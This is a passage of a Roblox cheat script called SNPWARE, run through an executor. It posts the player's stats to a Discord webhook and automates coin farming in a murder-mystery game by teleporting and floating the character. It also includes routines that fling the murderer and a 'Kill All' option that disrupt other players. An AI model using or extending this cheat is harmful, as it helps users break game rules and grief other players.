	discordWebhookRefreshDropdown(dropdownval.discordWebhookSaved)
end

discordCommaNumber = function(arg)
	local str2 = tostring(math.floor(tonumber(arg) or 0))
	local v_2

	while true do
		local v_3
		v_2, v_3 = string.gsub(str2, "^(-?%d+)(%d%d%d)", "%1,%2")

		if v_3 ~= 0 then
			str2 = v_2
		else
			break
		end
	end

	return v_2
end

discordGetLevelFromXp = function(arg)
	if not discordLevelXpTable then
		discordLevelXpTable = {}
		local n = 0

		for i = 1, 100 do
			local n2 = i - 1
			n += (1000 + 225 * i) * i - 225 * i * 0.5 * (i - 1) - 1000 - 225 - (1000 + 225 * n2) * n2 - 225 * n2 * 0.5 * (n2 - 1) - 1000 - 225
			discordLevelXpTable[i] = n
		end
	end

	local n = tonumber(arg) or 0
	if n >= 1237500 then
		return 100
	end

	for i = 1, 99 do
		local v_2 = discordLevelXpTable[i]
		local v_3 = discordLevelXpTable[i + 1]

		if v_3 == nil then
			if v_2 <= n then
				return i
			end
			continue
		end

		if v_2 <= n and n < v_3 then
			return i
		end
	end

	return 1
end

discordSyncProfileFromRemote = function()
	local remotes = ReplicatedStorage:FindFirstChild("Remotes")
	remotes = remotes and remotes:FindFirstChild("Inventory")
	local getProfileData = remotes and remotes:FindFirstChild("GetProfileData")
	if not getProfileData then
		return false
	end

	local ok, result = pcall(function()
		return getProfileData:InvokeServer()
	end)

	if not ok or type(result) ~= "table" then
		autofarmDbg("WARN", "discord", "GetProfileData failed", { err = tostring(result) })
		return false
	end
	local owned = result.Materials and result.Materials.Owned
	discordApplyCoinsTotal(owned and owned.Coins or result.Coins or 0)
	discordApplyXpTotal(result.NewXP or 0)
	discordAccountGems = owned and owned.Gems or result.Gems or 0
	discordAccountPrestige = result.Prestige or 0
	return true
end

discordGetAccountSnapshot = function()
	local n = discordAccountCoins or 0
	local n2 = discordAccountGems or 0
	local n3 = discordAccountXP or 0

	return {
		coins = n,
		gems = n2,
		xp = n3,
		prestige = discordAccountPrestige or 0,
		level = discordGetLevelFromXp(n3),
	}
end

discordSyncAccountTotals = function()
	discordSyncProfileFromRemote()
end

discordLogHttpResponse = function(arg, arg2, arg3)
	local HttpService2 = game:GetService("HttpService")

	if arg2 then
		local str2 = ""

		if type(arg2.Headers) == "table" then
			local ok, result = pcall(function()
				return HttpService2:JSONEncode(arg2.Headers)
			end)

			str2 = ok and tostring(result):sub(1, 200) or ""
		end

		autofarmDbg("INFO", "discord", "http response", {
			transport = arg,
			code = arg2.StatusCode or arg2.status or arg2.Status,
			success = arg2.Success,
			body = tostring(arg2.Body or arg2.body or ""):sub(1, 500),
			headers = str2,
		})
	elseif arg3 then
		autofarmDbg("ERROR", "discord", "http error", { transport = arg, err = tostring(arg3) })
	end
end

discordBuildEmbed = function(arg)
	local tbl5 = arg or {}
	local str2 = "https://api.newstargeted.com/roblox/users/v1/avatar-headshot?userid=" .. tostring(localPlayer.UserId) .. "&size=150x150&format=Png&isCircular=false"
	local tbl6 = tbl5.skipAccount and {} or discordGetAccountSnapshot()
	local tbl7 = {}

	if type(tbl5.fields) == "table" then
		for _, field in ipairs(tbl5.fields) do
			table.insert(tbl7, field)
		end
	end

	if not tbl5.skipAccount then
		table.insert(tbl7, 1, {
			name = "Account",
			value = "**" .. localPlayer.Name .. "** · `" .. localPlayer.UserId .. "`\n" .. "Level **" .. tostring(tbl6.level) .. "** · Prestige **" .. tostring(tbl6.prestige) .. "** · Gems **" .. discordCommaNumber(tbl6.gems) .. "**",
			inline = false,
		})

		if not tbl5.hideBalances then
			table.insert(tbl7, { name = "Coins", value = "`" .. discordCommaNumber(tbl6.coins) .. "`", inline = true })
			table.insert(tbl7, { name = "XP", value = "`" .. discordCommaNumber(tbl6.xp) .. "`", inline = true })

			table.insert(tbl7, {
				name = "Executor",
				value = "`" .. tostring(identifyexecutor() or "Unknown") .. "`",
				inline = true,
			})
		end
	end

	local tbl8 = {
		title = tostring(tbl5.title or "SNPWARE"),
		description = tbl5.description,
		color = tbl5.color or 5814783,
		fields = #tbl7 > 0 and tbl7 or nil,
		footer = { text = "@" .. localPlayer.Name },
		timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
	}

	if str2 then
		tbl8.author = {
			name = localPlayer.DisplayName ~= localPlayer.Name and localPlayer.DisplayName .. " (@" .. localPlayer.Name .. ")" or "@" .. localPlayer.Name,
			icon_url = str2,
		}

		tbl8.thumbnail = { url = str2 }
	end

	if tbl5.mentionEveryone then
		tbl8.__content = "@everyone"
	elseif tbl5.content and tostring(tbl5.content) ~= "" then
		tbl8.__content = tostring(tbl5.content)
	end

	return tbl8
end

discordSendWebhookImmediate = function(arg)
	local v_2 = discordWebhookGetActiveUrl()
	if not isValidDiscordWebhook(v_2) then
		autofarmDbg("WARN", "discord", "send skipped — invalid webhook", { runnings = values.runnings, len = #v_2, urlTail = v_2:sub(-16) })
		return false
	end
	local HttpService2 = game:GetService("HttpService")
	local content = arg and arg.__content
	local tbl5 = arg

	if content then
		tbl5 = {}

		for k, v_3 in pairs(arg) do
			if k ~= "__content" then
				tbl5[k] = v_3
			end
		end
	end

	local ok, result = pcall(function()
		local tbl6 = { embeds = { tbl5 } }

		if content then
			tbl6.content = content

			if content:find("@everyone", 1, true) then
				tbl6.allowed_mentions = { parse = { "everyone" } }
			end
		end

		return HttpService2:JSONEncode(tbl6)
	end)

	if not ok then
		autofarmDbg("ERROR", "discord", "JSONEncode failed", { err = tostring(result) })
		return false
	end
	local v_3 = result
	local tbl6 = { ["Content-Type"] = "application/json" }
	autofarmDbg("INFO", "discord", "send begin", { title = arg and arg.title, urlTail = v_2:sub(-16), queued = #discordWebhookQueue, bodyLen = #v_3 })
	local v_4 = request or http_request
	local request_

	if v_4 then
		request_ = v_4
	else
		request_ = syn and syn.request
	end

	if request_ then
		local ok2, result2 = pcall(function()
			return request_({ Url = v_2, Method = "POST", Headers = tbl6, Body = v_3 })
		end)

		if ok2 and result2 then
			local statusCode = result2.StatusCode or result2.status or result2.Status
			discordLogHttpResponse("request", result2)
			if not statusCode or statusCode < 400 then
				autofarmDbg("INFO", "discord", "send ok (request)", { code = statusCode })
				return true
			end
			warn("[Discord] request failed:", statusCode, result2.Body or result2.body or "")
		elseif not ok2 then
			discordLogHttpResponse("request", nil, result2)
			warn("[Discord] request error:", result2)
		end
	else
		autofarmDbg("WARN", "discord", "request() unavailable", {})
	end

	local ok2, result2 = pcall(function()
		return HttpService2:RequestAsync({ Url = v_2, Method = "POST", Headers = tbl6, Body = v_3 })
	end)

	if not ok2 then
		discordLogHttpResponse("HttpService", nil, result2)
		warn("[Discord] HttpService error:", result2)
		return false
	end

	discordLogHttpResponse("HttpService", result2)
	if result2 and result2.Success == false then
		warn("[Discord] HttpService failed:", result2.StatusCode, result2.Body)
		return false
	end

	if result2 and result2.Success then
		autofarmDbg("INFO", "discord", "send ok (HttpService)", { code = result2.StatusCode })
		return true
	end
	autofarmDbg("ERROR", "discord", "send failed — no transport", {})
	return false
end

discordPumpWebhookQueue = function()
	if discordWebhookQueueBusy then
		return
	end
	discordWebhookQueueBusy = true

	task.spawn(function()
		while #discordWebhookQueue > 0 do
			local v_2 = table.remove(discordWebhookQueue, 1)
			discordSendWebhookImmediate(v_2)

			if #discordWebhookQueue > 0 then
				task.wait(1.2)
			end
		end

		discordWebhookQueueBusy = false
	end)
end

sendDiscordWebhook = function(arg)
	autofarmDbg("DEBUG", "discord", "queued", { title = arg and arg.title, queueLen = #discordWebhookQueue + 1 })
	table.insert(discordWebhookQueue, arg)
	discordPumpWebhookQueue()
end

discordNotify = function(arg, arg2, arg3, arg4)
	if values[arg] == false then
		autofarmDbg("DEBUG", "discord", "notify skipped — toggle off", { flag = arg })
		return
	end

	if not values.runnings then
		if arg == "discordNotifyFullBag" or arg == "discordNotifyRoundStart" or arg == "discordNotifyRoundEnd" then
			autofarmDbg("DEBUG", "discord", "notify skipped — farm off", { flag = arg })
			return
		end
	end

	task.spawn(function()
		local ok, result = pcall(function()
			if type(arg2) == "table" then
				autofarmDbg("DEBUG", "discord", "notify", { flag = arg, title = arg2.title })
				sendDiscordWebhook(discordBuildEmbed(arg2))
				return
			end

			autofarmDbg("DEBUG", "discord", "notify", { flag = arg, title = arg2 })
			sendDiscordWebhook(discordBuildEmbed({ title = arg2, description = arg3, color = arg4 }))
		end)

		if not ok then
			autofarmDbg("ERROR", "discord", "notify build failed", { flag = arg, err = tostring(result) })
			warn("[Discord] notify failed:", result)
		end
	end)
end

discordResetRoundGains = function()
	discordRoundBaselined = true
	discordRoundCoinsGain = 0
	discordRoundXpGain = 0
	discordSyncAccountTotals()
end

discordApplyCoinsTotal = function(arg)
	local n = tonumber(arg) or 0
	local v_2 = discordAccountCoins
	if v_2 == nil then
		discordAccountCoins = n
		return
	end
	local n2 = n - v_2
	discordAccountCoins = n

	if discordRoundBaselined and n2 > 0 and values.runnings then
		discordRoundCoinsGain = discordRoundCoinsGain + n2
	end
end

discordApplyXpTotal = function(arg)
	local n = tonumber(arg) or 0
	local v_2 = discordAccountXP
	if v_2 == nil then
		discordAccountXP = n
		return
	end
	local n2 = n - v_2
	discordAccountXP = n

	if discordRoundBaselined and n2 > 0 and values.runnings then
		discordRoundXpGain = discordRoundXpGain + n2
	end
end

discordNotifyAccountRoundEnd = function(arg, arg2)
	if not values.runnings then
		return
	end
	local flag = values.discordNotifyAccountCoins ~= false
	local flag2 = values.discordNotifyAccountXP ~= false
	if not flag and not flag2 then
		return
	end
	local n = math.max(0, tonumber(arg) or 0)
	local n2 = math.max(0, tonumber(arg2) or 0)
	if flag and n <= 0 and flag2 and n2 <= 0 then
		return
	end
	discordSyncAccountTotals()
	local v_2 = discordGetAccountSnapshot()
	local tbl5 = {}

	if flag then
		table.insert(tbl5, {
			name = "Coins",
			value = "**+" .. discordCommaNumber(n) .. "** this round\nTotal: `" .. discordCommaNumber(v_2.coins) .. "`",
			inline = true,
		})
	end

	if flag2 then
		table.insert(tbl5, {
			name = "Experience",
			value = "**+" .. discordCommaNumber(n2) .. "** this round\nTotal: `" .. discordCommaNumber(v_2.xp) .. "` · Lv " .. tostring(v_2.level),
			inline = true,
		})
	end

	sendDiscordWebhook(discordBuildEmbed({
		title = "Round rewards",
		description = "Account balances updated after the round.",
		color = 15844367,
		fields = tbl5,
		hideBalances = true,
	}))
end

discordInitAccountTracker = function()
	task.spawn(function()
		for i = 1, 100 do
			if not discordSyncProfileFromRemote() then
				task.wait(0.2)
				continue
			end
			break
		end

		local inventory = ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("Inventory")

		inventory:WaitForChild("ChangeInventoryItem").OnClientEvent:Connect(function(arg, arg2, arg3)
			if arg == "Materials" and arg2 == "Coins" then
				discordApplyCoinsTotal(arg3)
			elseif arg == "Materials" and arg2 == "Gems" then
				discordAccountGems = tonumber(arg3) or 0
			end
		end)

		inventory:WaitForChild("ChangeProfileData").OnClientEvent:Connect(function(arg, arg2)
			if arg == "Coins" then
				discordApplyCoinsTotal(arg2)
			elseif arg == "NewXP" then
				discordApplyXpTotal(arg2)
			elseif arg == "Prestige" then
				discordAccountPrestige = tonumber(arg2) or 0
			elseif arg == "Gems" then
				discordAccountGems = tonumber(arg2) or 0
			end
		end)
	end)
end

autofarmGetRoundData = function()
	if autofarmCachedRoundData then
		return true, autofarmCachedRoundData
	end

	if not GetCurrentPlayerData then
		return false, nil
	end

	local ok, result = pcall(function()
		return GetCurrentPlayerData:InvokeServer()
	end)

	if ok and type(result) == "table" then
		autofarmCachedRoundData = result
		return true, result
	end
	return false, result
end

autofarmOnRoundDataChanged = function(arg)
	if type(arg) ~= "table" then
		return
	end
	local v_2 = autofarmLastPdEye
	autofarmCachedRoundData = arg
	local v_3 = autofarmEyeRolesBrief(arg)
	local v_4 = autofarmEyeMurderBrief(arg)
	local v_5 = arg[localPlayer.Name]

	local tbl5 = {
		roles = v_3,
		murder = v_4,
		localRole = v_5 and v_5.Role or nil,
		localDead = v_5 and v_5.Dead or nil,
		localKilled = v_5 and v_5.Killed or nil,
	}

	if v_2 then
		tbl5.prevLocalDead = v_2.localDead
		tbl5.prevLocalKilled = v_2.localKilled
		tbl5.prevMurderDead = v_2.pdMurderDead
		tbl5.prevKnife = v_2.knifeMurder
	end

	autofarmLastPdEye = {
		localDead = tbl5.localDead,
		localKilled = tbl5.localKilled,
		pdMurderDead = v_4.pdMurderDead,
		knifeMurder = v_4.knifeMurder,
	}

	if AUTOFARM_TRACE_MAX and (values.runnings or startround or roundend) then
		local pdMurderDead = v_4.pdMurderDead or tbl5.localDead or tbl5.localKilled
		local str2 = "EVENT"

		if pdMurderDead then
			str2 = "WARN"
		end

		autofarmDbg(str2, "pd", "PlayerDataChanged", autofarmSnap(tbl5))

		if str2 == "WARN" then
			flushAutofarmLog()
		end
	end

	if not values.runnings then
		return
	end
	local v_6 = autofarmShouldStopFarmRoundOver(arg)
	if v_6 then
		autofarmStopFarmMurderDead(v_6)
		return
	end
	local v_7 = arg[localPlayer.Name]

	if not v_7 then
		if startround or GetAfterRun() then
			status1 = "Not in round..."
			roundend = true
			startround = false

			if type(autofarmStopFloatDrive) == "function" then
				pcall(autofarmStopFloatDrive, "missing_local_pd")
			end

			autofarmDbg("WARN", "pd", "local missing from PlayerData", autofarmSnap(tbl5))
		else
			status1 = "Joining round..."
		end

		return
	end

	if v_7.Dead == true or v_7.Killed == true then
		status1 = "Dead — waiting..."
		autofarmDbg("WARN", "pd", "local Dead/Killed", autofarmSnap(tbl5))
	elseif startround and not roundend and not fullbag then
		status1 = "Farming..."
	end
end

autofarmLocalInRoundAlive = function(arg)
	local v_2 = arg or autofarmCachedRoundData
	if type(v_2) ~= "table" then
		return nil
	end
	local v_3 = v_2[localPlayer.Name]
	if not v_3 then
		return false
	end

	if v_3.Dead == true or v_3.Killed == true then
		return false
	end
	return true
end

autofarmLocalCanCollectCoins = function()
	local character = localPlayer.Character
	if not character then
		return false
	end
	local humanoid = character:FindFirstChildOfClass("Humanoid")
	local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
	if not humanoid or not humanoidRootPart then
		return false
	end

	if humanoid.Health <= 0 then
		return false
	end

	local ok, result = pcall(function()
		return humanoid:GetState()
	end)

	if ok and result == Enum.HumanoidStateType.Dead then
		return false
	end
	local v_2 = autofarmCachedRoundData
	if type(v_2) ~= "table" then
		return false
	end
	return autofarmLocalInRoundAlive(v_2) == true
end

autofarmIsMurdererEliminated = function(arg)
	local v_2 = arg or autofarmCachedRoundData
	if type(v_2) ~= "table" then
		return false
	end

	for _, v_3 in pairs(v_2) do
		if type(v_3) == "table" and v_3.Role == "Murderer" then
			return v_3.Dead == true or v_3.Killed == true
		end
	end

	return false
end

autofarmLocalIsMurderer = function(arg)
	local v_2 = arg or autofarmCachedRoundData
	local flag = type(v_2) == "table" and v_2[localPlayer.Name] or nil
	if flag and flag.Role == "Murderer" then
		return true
	end

	if type(findMurder) == "function" then
		local ok, result = pcall(findMurder)
		if ok and result == localPlayer then
			return true
		end
	end

	return false
end

autofarmAllNonMurderersEliminated = function(arg)
	local v_2 = arg or autofarmCachedRoundData
	if type(v_2) ~= "table" then
		return false
	end
	local flag = false

	for _, v_3 in pairs(v_2) do
		if type(v_3) == "table" and v_3.Role ~= "Murderer" then
			local flag2 = v_3.Dead ~= true and v_3.Killed ~= true
			flag = true
			if flag2 then
				return false
			end
		end
	end

	return flag
end

autofarmShouldStopFarmRoundOver = function(arg)
	if not values.runnings or not startround or roundend then
		return nil
	end
	arg = arg or autofarmCachedRoundData

	if autofarmLocalIsMurderer(arg) then
		if autofarmAllNonMurderersEliminated(arg) then
			return "local_murderer_all_others_dead"
		end
		return nil
	end

	if type(findMurder) ~= "function" then
		return nil
	end
	local ok, result = pcall(findMurder)
	if not ok then
		return nil
	end

	if result then
		autofarmHadAliveMurderer = true
		return nil
	end

	if autofarmHadAliveMurderer then
		return "findMurder_nil_after_alive"
	end
	return nil
end

autofarmStopFarmMurderDead = function(arg)
	if autofarmMurderRoundStopped then
		return
	end
	autofarmMurderRoundStopped = true
	local flag = roundend and not startround
	local flag2 = autofarmActiveTween ~= nil
	fullbag = false
	roundend = true
	startround = false
	status1 = "Murderer dead..."

	pcall(function()
		if autofarmActiveTween then
			autofarmActiveTween:Cancel()
			autofarmActiveTween = nil
		end

		autofarmClearFlyForces(localPlayer.Character and localPlayer.Character:FindFirstChild("HumanoidRootPart"), "murder_dead:" .. tostring(arg or "?"))
		local v_2 = autofarmCachedRoundData
		local flag3 = type(v_2) == "table" and v_2[localPlayer.Name] or nil

		if not flag3 then
			autofarmDbg("WARN", "land", "murder_dead spawn tp skipped — no local PlayerData", autofarmSnap({ reason = tostring(arg or "?") }))
		elseif flag3.Dead == true or flag3.Killed == true then
			autofarmDbg("WARN", "land", "murder_dead spawn tp skipped — local Dead/Killed", autofarmSnap({ reason = tostring(arg or "?"), pdDead = flag3.Dead == true, pdKilled = flag3.Killed == true }))
		else
			local humanoidRootPart = localPlayer.Character and localPlayer.Character:FindFirstChild("HumanoidRootPart")
			local flag4 = dropdownval and dropdownval.selectAfterFarm == "End Round|Kill All|Shoot"

			if not flag4 then
				flag4 = tostring(arg or "") == "local_murderer_all_others_dead"
			end

			local v_3, str2

			if flag4 then
				v_3 = hubTpToLobbySpawns(humanoidRootPart)
				str2 = v_3 and "lobby_Spawns" or "lobby_fail"
			else
				v_3, str2 = hubTpToMapSpawn(humanoidRootPart, 12)
			end

			autofarmDbg(v_3 and "INFO" or "WARN", "land", flag4 and "murder_dead lobby tp" or "murder_dead spawn tp", autofarmSnap({
				reason = tostring(arg or "?"),
				ok = v_3 == true,
				detail = tostring(str2 or ""),
				via = flag4 and "lobby_Spawns" or "Spawn|PlayerSpawn",
				sticky = flag4 and 0 or 12,
			}))
		end
	end)

	if not flag then
		autofarmDbg("WARN", "round", "murderer eliminated — stop farm", autofarmSnap({
			reason = arg,
			hadTween = flag2,
			tweenLeftActive = autofarmActiveTween ~= nil,
			note = "one-shot: clear BV + one map Spawn/PlayerSpawn TP if local not Dead/Killed",
		}))

		flushAutofarmLog()
	end

	if values.discordNotifyMurderDead and not autofarmMurderDeadNotified then
		autofarmMurderDeadNotified = true

		discordNotify("discordNotifyMurderDead", {
			title = "Murderer eliminated",
			description = "Autofarm stopped — murderer is dead.",
			color = 15158332,
			hideBalances = true,
		})
	end
end

autofarmInstallTraceHooks()

autofarmApplyRoundState = function(arg)
	if values.runnings then
		local v_2 = autofarmShouldStopFarmRoundOver(arg)
		if v_2 then
			autofarmStopFarmMurderDead(v_2)
			return
		end
	end

	local v_2 = arg[localPlayer.Name]

	if not v_2 then
		if autofarmRoundVictoryStopped then
			roundend = true
			startround = false
			return
		end

		if values.resetmurderer then
			if autofarmResetMurdererPhase ~= "nodata" and autofarmResetMurdererPhase ~= "victory" then
				autofarmResetMurdererPhase = "nodata"
				local v_3 = findMurder()

				if v_3 then
					status1 = "Flinging murder..."
					autofarmDbg("INFO", "fling", "nodata_reset", autofarmSnap({ murderer = v_3.Name }))

					while v_3 and values.runnings and values.resetmurderer do
						minifling(v_3)
						task.wait(2.4)
						v_3 = findMurder()
					end
				end
			end

			roundend = true
			startround = false
		elseif values.runnings and (startround or GetAfterRun()) then
			roundend = true
			startround = false
			status1 = "Not in round..."

			if type(autofarmStopFloatDrive) == "function" then
				pcall(autofarmStopFloatDrive, "not_in_round")
			end

			autofarmDbg("WARN", "round", "no PlayerData — not in round", autofarmSnap())
		end

		return
	end

	if v_2.Dead == true or v_2.Killed == true then
		if values.resetmurderer then
			if autofarmResetMurdererPhase ~= "dead" then
				autofarmResetMurdererPhase = "dead"
				local v_3 = findMurder()

				if v_3 then
					status1 = "Flinging murder..."
					autofarmDbg("INFO", "fling", "death_reset", autofarmSnap({ murderer = v_3.Name }))

					if activeToggle then
						activeToggle = "autofarmfling1"
					end

					while v_3 and values.runnings and values.resetmurderer do
						minifling(v_3)

						repeat
							task.wait(0.5)
						until not values.alr

						v_3 = findMurder()
					end
				else
					activeToggle = nil
				end

				activeToggle = nil
			end

			roundend = true
		end

		roundend = true
		startround = false

		if type(autofarmStopFloatDrive) == "function" and not values.resetmurderer then
			pcall(autofarmStopFloatDrive, "local_dead")
		end
	else
		autofarmResetMurdererPhase = nil

		if autofarmMurderRoundStopped then
			roundend = true
			startround = false
		elseif autofarmLocalCanCollectCoins() then
			roundend = false

			if GetAfterRun() then
				startround = true
			end
		else
			roundend = true
			status1 = "Respawning..."
		end
	end
end

autofarmInitStatusEvents = function()
	local gameplay = ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("Gameplay")

	if PlayerDataChanged then
		PlayerDataChanged.OnClientEvent:Connect(autofarmOnRoundDataChanged)
	end

	gameplay:WaitForChild("RoundStart").OnClientEvent:Connect(function(...)
		local v_2 = table.pack(...)
		values.bag = 0

		if values.runnings then
			status1 = "Round starting..."
		end

		autofarmDbg("EVENT", "round", "RoundStart", autofarmSnap({
			a1 = autofarmEyeArgBrief(select(1, ...)),
			a2 = autofarmEyeArgBrief(select(2, table.unpack(v_2, 1, v_2.n))),
		}))
	end)

	gameplay:WaitForChild("LoadingMap").OnClientEvent:Connect(function(...)
		values.bag = 0

		if values.runnings then
			status1 = "Loading map..."
		end

		autofarmDbg("EVENT", "round", "LoadingMap", autofarmSnap({ a1 = autofarmEyeArgBrief(select(1, ...)) }))

		if type(hubReapplyCustomSkybox) == "function" and values.customSkybox then
			local skyboxMapGen = (conns.skyboxMapGen or 0) + 1
			conns.skyboxMapGen = skyboxMapGen

			task.spawn(function()
				for _, v_2 in ipairs({ 0.2, 0.8, 1.6 }) do
					task.wait(v_2)
					if conns.skyboxMapGen ~= skyboxMapGen then
						return
					end
					hubReapplyCustomSkybox("loading_map")
				end
			end)
		end
	end)

	gameplay:WaitForChild("Fade").OnClientEvent:Connect(function(...)
		values.bag = 0

		if values.runnings then
			status1 = "Intermission..."
		end

		autofarmDbg("EVENT", "round", "Fade", autofarmSnap({ a1 = autofarmEyeArgBrief(select(1, ...)) }))
	end)

	gameplay:WaitForChild("VictoryScreen").OnClientEvent:Connect(function(...)
		local v_2 = table.pack(...)
		values.bag = 0

		if values.runnings then
			status1 = "Victory..."
			roundend = true
			startround = false
			fullbag = false
			autofarmRoundVictoryStopped = true
			autofarmResetMurdererPhase = "victory"

			if type(autofarmSafeLandAfterStop) == "function" then
				pcall(autofarmSafeLandAfterStop, "VictoryScreen")
			end

			pcall(function()
				local humanoidRootPart = localPlayer.Character and localPlayer.Character:FindFirstChild("HumanoidRootPart")
				if not humanoidRootPart then
					return
				end

				if dropdownval and dropdownval.selectAfterFarm == "End Round|Kill All|Shoot" then
					hubTpToLobbySpawns(humanoidRootPart)
				else
					hubTpToMapSpawn(humanoidRootPart, 6)
				end
			end)

			autofarmDbg("WARN", "round", "VictoryScreen — stop farm", autofarmSnap({
				a1 = autofarmEyeArgBrief(select(1, ...)),
				a2 = autofarmEyeArgBrief(select(2, table.unpack(v_2, 1, v_2.n))),
				a3 = autofarmEyeArgBrief(select(3, table.unpack(v_2, 1, v_2.n))),
				a4 = autofarmEyeArgBrief(select(4, table.unpack(v_2, 1, v_2.n))),
			}))

			flushAutofarmLog()
		end
	end)

	gameplay:WaitForChild("GameOver").OnClientEvent:Connect(function()
		values.bag = 0

		if values.runnings then
			status1 = "Game over..."
			roundend = true
			startround = false
			fullbag = false
			autofarmRoundVictoryStopped = true
			autofarmResetMurdererPhase = "victory"

			if type(autofarmSafeLandAfterStop) == "function" then
				pcall(autofarmSafeLandAfterStop, "GameOver")
			end

			pcall(function()
				local humanoidRootPart = localPlayer.Character and localPlayer.Character:FindFirstChild("HumanoidRootPart")
				if not humanoidRootPart then
					return
				end

				if dropdownval and dropdownval.selectAfterFarm == "End Round|Kill All|Shoot" then
					hubTpToLobbySpawns(humanoidRootPart)
				else
					hubTpToMapSpawn(humanoidRootPart, 6)
				end
			end)

			autofarmDbg("WARN", "round", "GameOver — stop farm", autofarmSnap())
			flushAutofarmLog()
		end
	end)

	autofarmInstallGameplayEye()
end

RoundEndFade.OnClientEvent:Connect(function()
	if not values.runnings then
		return
	end

	if values.discordNotifyAccountCoins == false and values.discordNotifyAccountXP == false then
		return
	end
	local n = discordRoundCoinsGain
	local n2 = discordRoundXpGain

	task.spawn(function()
		task.wait(2.5)
		local getLastRoundRewards = ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("Gameplay"):FindFirstChild("GetLastRoundRewards")

		if getLastRoundRewards then
			local ok, result = pcall(function()
				return getLastRoundRewards:InvokeServer()
			end)

			if ok and type(result) == "table" then
				local playerData = result.PlayerData and result.PlayerData[localPlayer.Name]

				if playerData and playerData.Coins then
					n = math.max(n, tonumber(playerData.Coins) or 0)
				end

				if result.Rewards and result.Rewards.TotalEarnedXP then
					n2 = math.max(n2, tonumber(result.Rewards.TotalEarnedXP) or 0)
				end
			end
		end

		discordSyncAccountTotals()
		discordNotifyAccountRoundEnd(n, n2)
		discordRoundBaselined = false
	end)
end)

autofarmFloatPart = nil
autofarmFloatLayActive = false
local cframe = CFrame.Angles(1.5707963267948966, 0, 0)

autofarmGetCameraYaw = function()
	local currentCamera = workspace.CurrentCamera
	if not currentCamera then
		return 0
	end
	local lookVector = currentCamera.CFrame.LookVector
	return math.atan2(-lookVector.X, -lookVector.Z)
end

autofarmBuildLayCFrame = function(arg)
	if UserInputService.MouseBehavior == Enum.MouseBehavior.LockCenter then
		local cframe2 = CFrame.Angles
		return CFrame.new(arg) * cframe2(1.5707963267948966, autofarmGetCameraYaw(), 0)
	end
	return CFrame.new(arg) * cframe
end

autofarmDestroyFloatPart = function()
	if autofarmFloatPart then
		local parent = autofarmFloatPart.Parent

		pcall(function()
			autofarmFloatPart:Destroy()
		end)

		if parent and parent:IsA("Folder") then
			pcall(function()
				parent:Destroy()
			end)
		end
	end

	autofarmFloatPart = nil
end

autofarmCreateFloatPart = function()
	autofarmDestroyFloatPart()
	local humanoidRootPart = localPlayer.Character and localPlayer.Character:FindFirstChild("HumanoidRootPart")
	if not humanoidRootPart then
		return nil
	end
	local folder = Instance.new("Folder")
	folder.Name = "SNP_FloatDrive"
	folder.Parent = workspace
	local part = Instance.new("Part")
	part.Name = "SNP_FloatPart"
	part.Size = Vector3.one
	part.Transparency = 1
	part.Anchored = true
	part.Massless = true
	part.CanCollide = false
	part.CanQuery = false
	part.CanTouch = false
	part.CastShadow = false
	part.CFrame = autofarmBuildLayCFrame(humanoidRootPart.Position)
	part.Parent = folder
	autofarmFloatPart = part
	return part
end

autofarmSyncHrpToFloat = function(arg)
	if not arg or not autofarmFloatPart then
		return
	end

	if UserInputService.MouseBehavior == Enum.MouseBehavior.LockCenter then
		arg.CFrame = autofarmBuildLayCFrame(autofarmFloatPart.Position)
	else
		arg.CFrame = autofarmFloatPart.CFrame
	end

	arg.AssemblyLinearVelocity = Vector3.zero
	arg.AssemblyAngularVelocity = Vector3.zero
end

autofarmStandUpright = function(arg, arg2)
	if arg then
		local v_2 = autofarmGetCameraYaw()
		arg.CFrame = CFrame.new(arg.Position) * CFrame.Angles(0, v_2, 0)
		arg.AssemblyLinearVelocity = Vector3.zero
		arg.AssemblyAngularVelocity = Vector3.zero
	end

	if arg2 then
		arg2.Sit = false
		arg2.AutoRotate = true

		pcall(function()
			arg2:ChangeState(Enum.HumanoidStateType.GettingUp)
		end)
	end
end

autofarmSetFloatLayActive = function(arg, arg2, arg3)
	if autofarmFloatLayActive == arg then
		return
	end
	autofarmFloatLayActive = arg

	if arg then
		if arg2 then
			arg2.Sit = false
			arg2.AutoRotate = false

			for _, v_2 in ipairs(arg2:GetPlayingAnimationTracks()) do
				if v_2.IsPlaying then
					pcall(function()
						v_2:Stop()
					end)
				end
			end
		end
	else
		autofarmStandUpright(arg3, arg2)
	end
end

autofarmOnFloatSync = function()
	if not values.runnings then
		return
	end

	if values.alr or autofarmKillAllBusy then
		return
	end

	if dropdownval.farmType ~= "Floating" then
		return
	end

	if autofarmLandBusy then
		return
	end

	if roundend or not startround then
		return
	end

	if not autofarmLocalCanCollectCoins() then
		return
	end
	local character = localPlayer.Character
	if not character then
		return
	end
	local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
	local humanoid = character:FindFirstChildOfClass("Humanoid")
	if not humanoidRootPart then
		return
	end
	autofarmSetFloatLayActive(true, humanoid, humanoidRootPart)

	if not autofarmFloatPart then
		autofarmCreateFloatPart()
	end

	if autofarmFloatPart then
		autofarmSyncHrpToFloat(humanoidRootPart)
	end
end

autofarmStartFloatDrive = function()
	if not conns.autofarmFloatSync then
		conns.autofarmFloatSync = RunService.Heartbeat:Connect(autofarmOnFloatSync)
	end
end

autofarmStopFloatDrive = function(arg)
	if not autofarmFloatPart and not conns.autofarmFloatSync and not autofarmActiveTween then
		return
	end

	if autofarmActiveTween then
		pcall(function()
			autofarmActiveTween:Cancel()
		end)

		autofarmActiveTween = nil
	end

	if conns.autofarmFloatSync then
		pcall(function()
			conns.autofarmFloatSync:Disconnect()
		end)

		conns.autofarmFloatSync = nil
	end

	local character = localPlayer.Character
	local humanoidRootPart = character and character:FindFirstChild("HumanoidRootPart")
	local humanoid = character and character:FindFirstChildOfClass("Humanoid")
	autofarmDestroyFloatPart()
	autofarmSetFloatLayActive(false, humanoid, humanoidRootPart)

	if AUTOFARM_TRACE_MAX then
		autofarmDbg("INFO", "float", "drive stopped", { reason = tostring(arg or "?") })
	end
end

autofarmLandBusy = false

autofarmSafeLandAfterStop = function(arg)
	if autofarmLandBusy then
		local v_2 = autofarmDbg
		local tbl5 = {}
		local v_3 = tostring
		arg = arg or "?"
		tbl5.reason = v_3(arg)
		v_2("TRACE", "land", "stop land skipped — busy", tbl5)
		return
	end

	autofarmLandBusy = true

